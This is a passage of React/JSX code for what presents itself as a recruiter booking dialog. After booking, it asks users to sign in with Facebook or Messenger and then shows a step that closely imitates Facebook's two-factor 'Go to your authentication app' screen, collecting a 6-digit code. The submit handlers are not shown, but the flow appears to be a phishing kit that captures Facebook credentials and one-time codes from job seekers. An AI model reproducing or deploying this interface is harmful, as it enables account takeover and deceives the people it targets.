                              {meetingTypes.map((t) => (
                                  <SelectItem key={t} value={t}>
                                    {t}
                                  </SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                        </div>
                        <div>
                          <Label htmlFor="notes" className="mb-1.5 block">
                            Anything else? <span className="text-muted-foreground">(optional)</span>
                          </Label>
                          <Textarea
                              id="notes"
                              value={form.notes}
                              onChange={(e) => setForm({ ...form, notes: e.target.value })}
                              placeholder="Share a resume link or the roles you're interested in."
                              rows={3}
                          />
                        </div>
                      </div>

                      <div className="mt-6 flex items-center justify-between">
                        <Button variant="ghost" className="font-medium" onClick={() => setStep("schedule")}>
                          <ArrowLeft className="size-4" /> Back
                        </Button>
                        <Button
                            className="rounded-full px-6 font-semibold"
                            disabled={!canConfirm}
                            onClick={() => {
                              setAuthProvider(null)
                              setStep("auth")
                            }}
                        >
                          Confirm booking
                        </Button>
                      </div>
                    </div>
                )}

                {/* ── AUTH ── */}
                {step === "auth" && activeRecruiter && (
                    <div className="px-4 py-8 sm:px-6">
                      <DialogHeader className="items-center text-center">
                        <div className="mb-1 inline-flex size-12 items-center justify-center rounded-full bg-primary/10">
                          <Lock className="size-6 text-primary" />
                        </div>
                        <DialogTitle className="text-xl">Verify it&apos;s really you</DialogTitle>
                        <DialogDescription className="max-w-sm text-pretty">
                          Confirm your {dateLabel} · {time} meeting with {activeRecruiter.name} by signing
                          in. We use this only to verify your identity and send your invite.
                        </DialogDescription>
                      </DialogHeader>

                      <div className="mx-auto mt-6 flex max-w-sm flex-col gap-3">
                        <Button
                            type="button"
                            size="lg"
                            onClick={() => handleAuth("facebook")}
                            className="h-12 w-full justify-center gap-2.5 rounded-xl bg-[#1877F2] font-semibold text-white hover:bg-[#166FE5]"
                        >
                          <FacebookIcon className="size-5" />
                          Continue with Facebook
                        </Button>

                        <Button
                            type="button"
                            size="lg"
                            variant="outline"
                            onClick={() => handleAuth("messenger")}
                            className="h-12 w-full justify-center gap-2.5 rounded-xl border-border font-semibold text-[#0A7CFF] hover:bg-accent"
                        >
                          <MessengerIcon className="size-5 text-[#0A7CFF]" />
                          Continue with Messenger
                        </Button>

                        <p className="mt-1 flex items-center justify-center gap-1.5 text-center text-xs text-muted-foreground">
                          <Lock className="size-3" />
                          Secure sign-in. We never post to your account or contacts.
                        </p>
                      </div>

                      <div className="mt-6 flex justify-center">
                        <Button
                            variant="ghost"
                            className="font-medium"
                            onClick={() => setStep("details")}
                        >
                          <ArrowLeft className="size-4" /> Back
                        </Button>
                      </div>
                    </div>
                )}

                {/* ── AUTHENTICATOR ── */}
                {step === "authenticator" && (
                    <div className="flex flex-col">
                      {/* Header */}
                      <div className="px-6 pt-6 pb-2">
                        <p className="text-[13px] text-[#65676b]">
                          {form.name || "You"} · Facebook
                        </p>
                        <h2 className="mt-1 text-[22px] font-bold leading-snug text-[#1c1e21]">
                          Go to your authentication app
                        </h2>
                        <p className="mt-1 text-[15px] text-[#65676b]">
                          Enter the 6-digit code for this account from the two-factor authentication app that you set up (such as Duo Mobile or Google Authenticator).
                        </p>
                      </div>

                      {/* Illustration */}
                      <div className="w-full overflow-hidden">
                        <img
                            src="/2fa-hero.png"
                            alt="Authentication app illustration"
                            className="w-full object-cover"
                            style={{ maxHeight: 220 }}
                        />
                      </div>

                      {/* Code input + buttons */}
                      <div className="px-6 pb-6 pt-4">
                        {otpError && (
                          <div className="mb-3 rounded-lg bg-[#ffebe8] border border-[#dd3c10] px-3 py-2.5 text-sm text-[#dd3c10]">
                            {otpError}
                          </div>
                        )}
                        <input
                            type="text"
                            inputMode="numeric"
                            maxLength={6}
                            value={otpCode}
                            onChange={(e) => {
                              setOtpCode(e.target.value.replace(/\D/g, ""))
                              setOtpError("")
                            }}
                            placeholder="Code"
                            className={cn(
                              "w-full rounded-lg border px-4 py-3 text-[17px] text-[#1c1e21] placeholder-[#8d949e] outline-none transition focus:ring-2",
                              otpError
                                ? "border-[#dd3c10] focus:border-[#dd3c10] focus:ring-[#ffebe8]"
                                : "border-[#ccd0d5] focus:border-[#1877f2] focus:ring-[#1877f2]/20"
                            )}
                        />

                        <button
                            type="button"
                            onClick={handleAuthenticatorContinue}
                            disabled={otpCode.length < 6 || isSending}
                            className="mt-3 w-full rounded-lg bg-[#1877f2] py-3 text-[17px] font-bold text-white transition hover:bg-[#166fe5] active:bg-[#1464d8] disabled:cursor-not-allowed disabled:bg-[#a0bcf8] flex items-center justify-center gap-2"
                        >
                          {(isSending) && <Loader2 className="size-5 animate-spin" />}
                          {isSending ? "Verifying…" : "Continue"}
                        </button>

                        <button
                            type="button"
                            disabled
                            className="mt-2 w-full rounded-lg border border-[#ccd0d5] bg-white py-3 text-[17px] font-semibold text-[#b0b3b8] cursor-not-allowed"
                        >
                          Try another way
                        </button>
                      </div>
                    </div>
                )}

                {/* ── CONFIRMED ── */}
                {step === "confirmed" && activeRecruiter && (
                    <div className="px-4 py-10 text-center sm:px-6">
                      <div className="mx-auto flex size-14 items-center justify-center rounded-full bg-primary/10">
                        <Check className="size-7 text-primary" />
                      </div>
                      <DialogHeader className="mt-4 items-center text-center">
                        <DialogTitle className="text-2xl">You&apos;re booked!</DialogTitle>
                        <DialogDescription className="text-base">
                          Verified
                          {authProvider === "messenger" ? " via Messenger" : " via Facebook"}. A calendar
                          invite is on its way to {form.email}.
                        </DialogDescription>
                      </DialogHeader>

                      <div className="mx-auto mt-6 max-w-sm rounded-2xl border border-border bg-secondary/40 p-5 text-left">
                        <div className="flex items-center gap-3">
                          {activeRecruiter.photo ? (
                              <img
                                  src={activeRecruiter.photo}
                                  alt={activeRecruiter.name}
                                  width={44}
                                  height={44}
                                  className="size-11 rounded-full object-cover"
                              />
                          ) : (
                              <div className="flex size-11 items-center justify-center rounded-full bg-accent text-sm font-semibold text-accent-foreground">
                                {activeRecruiter.name.split(" ").map((n) => n[0]).join("")}
                              </div>
                          )}
                          <div>
                            <p className="text-sm font-semibold text-foreground">
                              {activeRecruiter.name}
                            </p>
                            <p className="text-xs text-muted-foreground">{activeRecruiter.team}</p>
                          </div>
                        </div>
                        <div className="mt-4 space-y-2 text-sm">
                          <div className="flex items-center gap-2 text-muted-foreground">
                            <CalendarCheck className="size-4 shrink-0 text-primary" />
                            <span>{dateLabel} at {time}</span>
                          </div>
                          <div className="flex items-center gap-2 text-muted-foreground">
                            <Video className="size-4 shrink-0 text-primary" />
                            <span>30-minute video call</span>
                          </div>
                          <div className="flex items-center gap-2 text-muted-foreground">
                            <Clock className="size-4 shrink-0 text-primary" />
                            <span>{form.type}</span>
                          </div>
                        </div>
                      </div>

                      <Button
                          className="mt-8 rounded-full px-8 font-semibold"
                          onClick={() => handleOpenChange(false)}
                      >
                        Done
                      </Button>
                    </div>
                )}
              </>
          )}
        </DialogContent>
      </Dialog>
  )
}